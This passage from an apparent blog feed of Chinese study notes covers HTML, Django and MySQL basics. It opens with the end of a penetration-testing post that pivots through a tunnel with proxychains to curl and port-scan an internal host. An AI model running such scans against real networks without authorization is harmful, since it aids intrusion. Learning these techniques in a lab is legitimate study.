src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/image-20231022003719072.png" alt="image-20231022003719072"></p><p>端口要和绑定的一样</p></li><li><p>然后使用代理连接内网机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">proxychains curl http://192.168.22.22<br></code></pre></td></tr></table></figure></li><li><p>对内网机经行端口扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">proxychains nmap -sT -Pn -p- -n -T4 192.168.22.22 <br></code></pre></td></tr></table></figure><p>由于代理不是很稳定，所以我们重新开启一下</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>html</title>
    <link href="/2023/10/07/%E5%89%8D%E7%AB%AF/HTML/html/"/>
    <url>/2023/10/07/%E5%89%8D%E7%AB%AF/HTML/html/</url>
    
    <content type="html"><![CDATA[<h1 id="前端学习"><a href="#前端学习" class="headerlink" title="前端学习"></a>前端学习</h1><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><ol><li><p>将一个文本单独呈现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>    这个一个段落（paragraph）<br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>html标签不区分大小写</p></li><li><p>&lt;em&gt;表示斜体</p></li><li><p>&lt;strong&gt;表示强调</p></li><li><p>块级元素</p><p>可以理解为每一个块之间有空隙</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>内联元素</p><p>可以理解为每一元素之间没有空隙</p></li><li><p>&lt;img&gt;插入图片</p></li><li><p>可以在起始的元素哪里表示元素的性质</p></li><li><p>&lt;a&gt;用于超链接</p></li><li><p>部分属性</p><ul><li>href声明链接的web地址</li><li>title属性为超链接声明的额外信息</li></ul></li><li><p>&lt;input&gt;输入属性</p></li><li><p>注释</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html">    <span class="hljs-comment">&lt;!---注释--&gt;</span><br><br><br><br>## html元信息<br><br>1. 元信息就是包含在\<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>里面的<br><br>2. 头部信息不会出现在渲染里<br><br>3. 文档的字符编码<br><br>   ```html<br>   <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span> /&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">mate</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>mate的name属性说明这个是什么东西</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"> <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;description&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;hhh&quot;</span>&gt;</span> <span class="hljs-comment">&lt;!-- 描述 --&gt;</span><br><span class="hljs-comment">&lt;!-- content 里面就是内容--&gt;</span><br></code></pre></td></tr></table></figure><p>并且使用浏览器搜索的时候也会展现这个内容</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/frontEnd/HTML/image-20231011104302004.png" alt="image-20231011104302004"></p></li><li><p>添加css文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;mycss.css&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>rel</code>指的是使用的文档格式</p><p><code>hrefj</code>就是使用的css</p></li></ol><h2 id="文本处理基础"><a href="#文本处理基础" class="headerlink" title="文本处理基础"></a>文本处理基础</h2><ol><li><p>段落</p><p><code>&lt;p&gt;</code></p></li><li><p>标题</p><p><code>&lt;h&gt;</code></p></li><li><p>无序列表</p><p><code>&lt;ul&gt;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>豆浆<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>油条<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>豆汁<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>焦圈<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><br></code></pre></td></tr></table></figure></li><li><p>有序列表</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>字体的设置</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> <span class="hljs-comment">&lt;!-- 斜体 --&gt;</span><br>    test <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> <span class="hljs-comment">&lt;!-- 普通 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> <span class="hljs-comment">&lt;!-- 粗体 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>创建链接</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;url&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><br>        第一个标题<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>redis</title>
    <link href="/2023/10/01/redis/redis/"/>
    <url>/2023/10/01/redis/redis/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
    <tags>
      
      <tag>redis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>django</title>
    <link href="/2023/09/22/python/django/"/>
    <url>/2023/09/22/python/django/</url>
    
    <content type="html"><![CDATA[<h1 id="django"><a href="#django" class="headerlink" title="django"></a>django</h1><h2 id="基本认识"><a href="#基本认识" class="headerlink" title="基本认识"></a>基本认识</h2><h3 id="数据迁移"><a href="#数据迁移" class="headerlink" title="数据迁移"></a>数据迁移</h3><p>映射到数据库</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">python manage.py makemigrations<br>python manage.py migrate<br></code></pre></td></tr></table></figure><h3 id="创建APP"><a href="#创建APP" class="headerlink" title="创建APP"></a>创建APP</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> manage.<span class="hljs-keyword">py</span> startapp app_name<br></code></pre></td></tr></table></figure><h3 id="基本视图"><a href="#基本视图" class="headerlink" title="基本视图"></a>基本视图</h3><h4 id="返回响应的response"><a href="#返回响应的response" class="headerlink" title="返回响应的response"></a>返回响应的response</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_func</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;test&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="渲染一个html"><a href="#渲染一个html" class="headerlink" title="渲染一个html"></a>渲染一个html</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">user_add</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> render(request, <span class="hljs-string">&quot;user_add.html&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="整体的框架"><a href="#整体的框架" class="headerlink" title="整体的框架"></a>整体的框架</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/django/image-20230923191111893.png" alt="image-20230923191111893"></p><h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><h4 id="子路由的写法"><a href="#子路由的写法" class="headerlink" title="子路由的写法"></a>子路由的写法</h4><p>一般只需要一个子路由，这里我们使用app  ： user</p><p>首先需要在app里面创建urls.py文件，然后像主文件里面的urls一样添加路径就很好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.urls <span class="hljs-keyword">import</span> path <br><br><span class="hljs-keyword">import</span> user.views<br><span class="hljs-comment"># from user import views</span><br><span class="hljs-keyword">from</span> user.views <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 子路由</span><br><br>urlpatterns = [<br>    path(<span class="hljs-string">&#x27;user_test/&#x27;</span>, user_test),<br>]<br><br></code></pre></td></tr></table></figure><p>然后主文件的urls.py如下图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.contrib <span class="hljs-keyword">import</span> admin<br><span class="hljs-keyword">from</span> django.urls <span class="hljs-keyword">import</span> path,include<br><span class="hljs-keyword">from</span> user.views <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> app01 <span class="hljs-keyword">import</span> views<br><br>urlpatterns = [<br>    path(<span class="hljs-string">&#x27;user/&#x27;</span>, include(<span class="hljs-string">&#x27;user.urls&#x27;</span>)),<span class="hljs-comment"># 配置子路由的路径</span><br>    path(<span class="hljs-string">&#x27;user/index&#x27;</span>, views.index),<br>    path(<span class="hljs-string">&#x27;user/add&#x27;</span>, views.user_add),<br>    path(<span class="hljs-string">&#x27;user/list&#x27;</span>, views.user_list),<br>]<br></code></pre></td></tr></table></figure><h3 id="创建模板"><a href="#创建模板" class="headerlink" title="创建模板"></a>创建模板</h3><p>在model.py里添加以下的数据 </p><p>创建模板的时候记得一定要继承models.Model<br>创建一个类，相当于表的结构</p><p>对象相当于一行数据</p><p>类的属性就是对应的字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.db <span class="hljs-keyword">import</span> models<br><br><br><span class="hljs-comment"># Create your models here.</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserModel</span>(models.Model):<br>    name = models.CharField(<span class="hljs-number">10</span>,unique=<span class="hljs-literal">True</span>)<br>    sex = models.CharField(<span class="hljs-number">10</span>)<br>    age = models.IntegerField(default=<span class="hljs-number">18</span>)<br>    is_delete = models.BooleanField(default=<span class="hljs-literal">False</span>)<br><br><br><br><span class="hljs-comment"># 相当于创建了一个用户表</span><br><span class="hljs-comment"># 姓名  varchar</span><br><span class="hljs-comment"># 性别  varchar</span><br><span class="hljs-comment"># 年龄  age</span><br><span class="hljs-comment"># 是否删除 bool</span><br><br></code></pre></td></tr></table></figure><p>模型改变就需要再次数据迁移</p><p>上面执行完的结果就是<br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/django/image-20230923213424682.png" alt="image-20230923213424682"></p><h3 id="后台的管理页面"><a href="#后台的管理页面" class="headerlink" title="后台的管理页面"></a>后台的管理页面</h3><ol><li><p>注册需要管理的模型</p><p>需要在admin.py里使用下面的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.contrib <span class="hljs-keyword">import</span> admin<br><span class="hljs-keyword">from</span> user.models <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># Register your models here.</span><br><br>admin.register(UserModel)<br><br></code></pre></td></tr></table></figure></li><li><p>创建超级管理员用户</p><p>使用下面的指令就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python manage.py createsuperuser<br></code></pre></td></tr></table></figure></li><li><p>添加admin的访问路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">path(<span class="hljs-string">&#x27;admin/&#x27;</span>, admin.site.urls)<br></code></pre></td></tr></table></figure></li><li><p>访问 后台管理系统</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8000</span><span class="hljs-regexp">/admin/</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="路由-1"><a href="#路由-1" class="headerlink" title="路由"></a>路由</h2><p>使用include使用子路由</p><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><ol><li><p>使用超链接的方向是</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&#123;# url转发测试 #&#125;<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/user/list&quot;</span>&gt;</span>路由转发测试，点击进入用户下·列表<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>主路由的urls随摆配置</p></li><li><p>使用反向解释的方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<span class="hljs-comment"># 反向解析 #&#125;</span><br>&#123;<span class="hljs-comment"># list 是path name的值 #&#125;</span><br>&lt;a href=<span class="hljs-string">&quot;&#123;% url &#x27;list&#x27; %&#125;&quot;</span>&gt;反向解析测试，点击进入用户下列表&lt;/a&gt;<br></code></pre></td></tr></table></figure><p>注意：这么写的话，主路由不能存在命名空间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">path(<span class="hljs-string">&#x27;user/&#x27;</span>, include(<span class="hljs-string">&#x27;user.urls&#x27;</span>))  <span class="hljs-comment"># 使用子路由</span><br>   <br></code></pre></td></tr></table></figure><p>子路由指定路由的名称</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">path(<span class="hljs-string">&#x27;list/&#x27;</span>, user_list, name=<span class="hljs-string">&#x27;list&#x27;</span>),<br></code></pre></td></tr></table></figure></li><li><p>使用命令空间的方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<span class="hljs-comment"># 命名空间反向解析 #&#125;</span><br>&lt;a href=<span class="hljs-string">&quot;&#123;% url &#x27;user:list&#x27; %&#125;&quot;</span>&gt;反向解析测试，点击进入用户下列表&lt;/a&gt;<br></code></pre></td></tr></table></figure><p>主路由一定存在namespace</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">path(<span class="hljs-string">&#x27;user/&#x27;</span>, include((<span class="hljs-string">&#x27;user.urls&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>), namespace=<span class="hljs-string">&#x27;user&#x27;</span>))  <span class="hljs-comment"># 使用命名空间</span><br></code></pre></td></tr></table></figure></li><li><p>使用重定向</p><p>关键字传参</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_redirect</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> redirect(reverse(<span class="hljs-string">&#x27;user:details&#x27;</span>, kwargs=&#123;<span class="hljs-string">&#x27;uid&#x27;</span>: <span class="hljs-number">2</span>&#125;))<br></code></pre></td></tr></table></figure><p>占位传参</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_redirect</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> redirect(reverse(<span class="hljs-string">&#x27;user:details&#x27;</span>, args=(<span class="hljs-number">2</span>,)))<br></code></pre></td></tr></table></figure><p>直接解析网址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_redirect</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>)<br></code></pre></td></tr></table></figure></li></ol><h2 id="模型基础"><a href="#模型基础" class="headerlink" title="模型基础"></a>模型基础</h2><p> 这个可以理解是数据库的结构</p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql_fast_learning</title>
    <link href="/2023/09/22/MYSQL/mysql-fast-learning/"/>
    <url>/2023/09/22/MYSQL/mysql-fast-learning/</url>
    
    <content type="html"><![CDATA[<h1 id="初始mysql"><a href="#初始mysql" class="headerlink" title="初始mysql"></a>初始mysql</h1><ol><li><p>登录数据库</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql -uroot  -proot<br></code></pre></td></tr></table></figure></li><li><p>查看当前数据库的字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> chg_girlfriends<br></code></pre></td></tr></table></figure></li><li><p>查看当前有哪些数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> databases;<br></code></pre></td></tr></table></figure></li><li><p>创建数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">creat database 数据库名字<br></code></pre></td></tr></table></figure></li><li><p>选中数据库操作</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">use 数据库的名称<br></code></pre></td></tr></table></figure></li><li><p>查看数据库的表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW TABLES;<br></code></pre></td></tr></table></figure></li><li><p>创建一个gril_friend的表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs MYSQL">create table student(<br>    name  char(4) not null ,<br>    sex   enum(&#x27;男&#x27;,&#x27;女&#x27;),<br>    id    char(11) primary key,<br>    class tinyint not null<br>);<br></code></pre></td></tr></table></figure></li><li><p>查看某个数据表的结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs MYSQL">DESCRIBE STUDENT;<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20230922091346627.png" alt="image-20230922091346627"></p></li><li><p>查看表中数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECt * FROM student;<br></code></pre></td></tr></table></figure></li><li><p>如何往数据表中添加数据记录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> student<br><span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;CHG&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure></li><li><p>数据类型的选择</p></li></ol><ul><li>时间类型看格式</li><li>整型和字符串类型看长度</li></ul><ol start="12"><li><p>更新字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE student CHANGE COLUMN classNum cn TINYINT;<br></code></pre></td></tr></table></figure></li><li><p>创建约束</p><ul><li><p>主键约束</p><p>不重复且不为空</p><p>创建一个主键：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE test(<br>test1 char PRIMARY KEY<br>);<br></code></pre></td></tr></table></figure><p>创建联合主键（加起来不重复，任何一个都不能为空）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE test(<br>test1 char,<br>test2 char,<br>PRIMARY KEY(test1,test2)<br>);<br></code></pre></td></tr></table></figure><p>创建自增主键：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE test(<br>test1 char,<br>test2 char,<br>test3 TINYINT AUTO_INCREMENT,<br>PRIMARY KEY(test1,test2,test3)<br>);<br></code></pre></td></tr></table></figure><p>给表添加主键：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">alter TABLE test DROP PRIMARY KEY;<br>ALTER TABLE test ADD PRIMARY KEY(test1,test2);<br></code></pre></td></tr></table></figure><p>删除主键：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">alter TABLE test DROP PRIMARY KEY;<br></code></pre></td></tr></table></figure><p>通过修改字段的方式增加主键(modify)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE test MODIFY test1 TINYINT PRIMARY KEY;<br></code></pre></td></tr></table></figure></li><li><p>唯一约束</p><p>该字段的值不可以重复</p><p>alter添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE test ADD UNIQUE(test1,test2);<br></code></pre></td></tr></table></figure></li><li><p>非空约束</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure></li><li><p>默认约束</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">default 默认值<br></code></pre></td></tr></table></figure><p>传了值就不会使用默认值</p></li><li><p>外键</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE class (<br>        name char(10) PRIMARY KEY,<br>        class_id TINYINT DEFAULT 4,<br>        student_name char(4),<br>        FOREIGN KEY (student_name) REFERENCES student(name)<br>    );<br></code></pre></td></tr></table></figure><p>​</p></li></ul><p></p></li><li><p>范式</p><ul><li><p>第一范式（1NF）</p><p>数据表中的所有的字段都是不可分割的原子值</p><p>就是满足填入的数据不可以拆分</p></li><li><p>第二范式(2NF)</p><p>必须是满足第一范式的前提下</p><p>一个表的所有列最好都和主键相关，不想关的拆解成其他表</p></li><li><p>第三范式(3NF)</p><p>满足第二范式</p><p>非主键不存在相关性</p></li></ul></li></ol><h1 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h1><h2 id="单表查询"><a href="#单表查询" class="headerlink" title="单表查询"></a>单表查询</h2><ol><li><p>数据准备</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 